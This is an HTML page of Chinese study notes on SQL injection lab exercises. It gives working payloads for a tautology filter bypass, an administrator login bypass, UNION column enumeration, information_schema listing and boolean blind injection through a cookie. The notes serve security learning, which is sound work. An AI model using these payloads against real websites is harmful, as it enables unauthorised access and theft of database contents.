@@ -1,0 +1,82 @@
+<hr />
+<h3 id="section-1">实战1：</h3>
+<p><img src="/assets/notion-e4dbf35e-ff1b-4246-8f71-adf65ed94620.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 1" loading="lazy"><br />题目已经很明确的给出了服务器的处理方式：</p>
+<pre class="note-code"><code class="language-sql">SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
+</code></pre>
+<p>我们看看服务端的处理方式：<br /><img src="/assets/notion-8ce4b3be-c0df-4019-84c8-85fcf28291b6.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 2" loading="lazy"><br />直接把category的值作为查阅字段，拼接进入SQL语句中，那么我们构造：</p>
+<pre class="note-code"><code class="language-php">GET /filter?category=Gifts'OR 1=1 -- HTTP/2
+</code></pre>
+<p>那么最终的SQL语句就变成了：</p>
+<pre class="note-code"><code class="language-sql">SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1;
+</code></pre>
+<p>查询语句做到永真。</p>
+<hr />
+<h3 id="section-2">实战二</h3>
+<p><img src="/assets/notion-e14e4e5c-568f-4ce1-b088-4ad5b9eb5f3f.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 3" loading="lazy"><br />此题需要我们以administrator身份登录，根据题目的信息我们可以知道，这个题的核心SQL语句是：</p>
+<pre class="note-code"><code class="language-sql">SELECT * FROM users WHERE username = 'input1' AND password = 'input2';
+</code></pre>
+<p>在用户名输入界面，我们随便输入一个用户名和密码，然后在burp中拦截数据包：<br /><img src="/assets/notion-effc7ac8-8171-488f-98f5-faf7c02b4a5e.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 4" loading="lazy"><br />然后改为：<br /><img src="/assets/notion-06a1b53a-b419-4723-bbba-487793d259b9.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 5" loading="lazy"><br />这样，最后执行的SQL语句就是：</p>
+<pre class="note-code"><code class="language-sql">SELECT * FROM users WHERE username = 'administrator'-- 后面的语句被注释了 
+</code></pre>
+<p>最后就能以管理员身份登录</p>
+<hr />
+<h3 id="section-3">实战3 UNION攻击</h3>
+<p>当应用程序存在 SQL 注入漏洞，且查询结果包含在应用程序的响应中，攻击者可以利于 UNION 关键字从数据库中的 UNION 关键字从数据库的其他表中检索数据。<br />UNION 关键字允许一个或多个附加的 SELECT 查询，并将结果附加到原始查询。例如：</p>
+<pre class="note-code"><code class="language-sql">SELECT a,b FROM table1 UNION SELECT c,d FROM table2
+</code></pre>
+<p>但是该查询要生效，必须各个查询返回相同数量的列、同时各个查询每个列的数据必须兼容。<br />所以要进行 UNION 攻击，通常要了解：</p>
+<ul>
+<li>原始查询返回了多少列？</li>
+<li>原始查询返回的哪些列的数据类型适合保存注入查询的结果？</li>
+</ul>
+<h4 id="section-4">确定所需列数</h4>
+<p>执行 SQL 注入 UNION 攻击的时候，有两种有效的方法可以确认原始查询返回了多少列。<br />方法一：<br />注入一系列的 ORDER BY 子句，并不断递增，直到发生错误：</p>
+<pre class="note-code"><code class="language-sql">' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+</code></pre>
+<p>当指定的索引超过结果集中的实际列数时，数据库会返回错误。例如：</p>
+<pre class="note-code"><code class="language-sql">The ORDER BY position number 3 is out of range of the number of items in the select list.
+</code></pre>
+<p>方法二：<br />提交一系列的 UNION SELECT 有效载荷，每个有效载荷指定不同数量的 NULL</p>
+<pre class="note-code"><code class="language-sql">' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+</code></pre>
+<p>如果空值的数量和列数不匹配，数据库将返回错误，例如：</p>
+<pre class="note-code"><code class="language-sql">All queries combined using a UNION, INTERSECT
+</code></pre>
+<h4 id="section-5">靶场真题</h4>
+<p><img src="/assets/notion-4ec91881-0bd1-4429-b785-f8d7443bd72d.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 6" loading="lazy"><br />选择一个分类后，在Burp中截取数据包，当列数不对时：<br /><img src="/assets/notion-08b03863-26d5-4655-a72d-f8b91f4638f4.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 7" loading="lazy"><br />当列数正确时：<br /><img src="/assets/notion-5bab217f-4b6c-40c0-af41-3550fa49a64b.png" alt="SQL 注入靶场练习：从查询逻辑到盲注 · 原笔记截图 8" loading="lazy"></p>
+<hr />
+<h3 id="section-6">实验四：查询具有有用数据类型的列</h3>
+<p>我们想要检索的数据通常是字符串格式的，所以我们需要在原始查询结果中找到一个或多个数据类型为字符串或者与字符串兼容的列。<br />确定列数后，可以逐列探测：</p>
+<pre class="note-code"><code class="language-sql">' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+</code></pre>
+<hr />
+<h3 id="section-7">列出数据库的内容：</h3>
+<pre class="note-code"><code class="language-sql">// 查询数据库中的表
+SELECT * FROM information_schema.tables
+
+//查询数据库中某个表有哪几列
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+//可以获取列名和数据类型
+</code></pre>
+<hr />
+<h3 id="section-8">盲注 SQL 注入</h3>
+<p>盲注指的是应用程序存在 SQL 注入漏洞，但是其HTTP响应不显示任何包含SQL查询结果或数据库错误的详细信息。<br />许多攻击方式，如 UNION 注入攻击等，依赖于服务器的回显结果，对盲注 SQL 注入漏洞无效。所以必须使用不同的技术。</p>
+<h4 id="section-9">利用盲注 SQL 注入出发条件响应</h4>
+<p>假设有一个应用程序使用 cookie 来收集用户使用情况分析数据。发送到该应用程序的请求包含如下所示的 cookie 标头：</p>
+<pre class="note-code"><code class="language-sql">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+</code></pre>
+<p>TrackingId 当处理包含 cookie 的请求时，应用程序会使用 SQL 查询来确认这是否是已知用户：</p>
+<pre class="note-code"><code class="language-sql">SELECT TrackingId FROM TrackedUsers WHERE TrackingId=u5YD3PapBcR4lN3e7Tj4
+</code></pre>
+<p>假设发送了两个请求，其中依次包含以下cookie值：</p>
+<pre class="note-code"><code class="language-sql">....' AND '1' = '1
+....' AND '1' = '2
+</code></pre>
+<p>第一个查询会返回查询结果，因此登录成功会显示欢迎回来；第二个值导致查询不到任何结果，因为条件永为假，所以不会显示欢迎回来。</p>
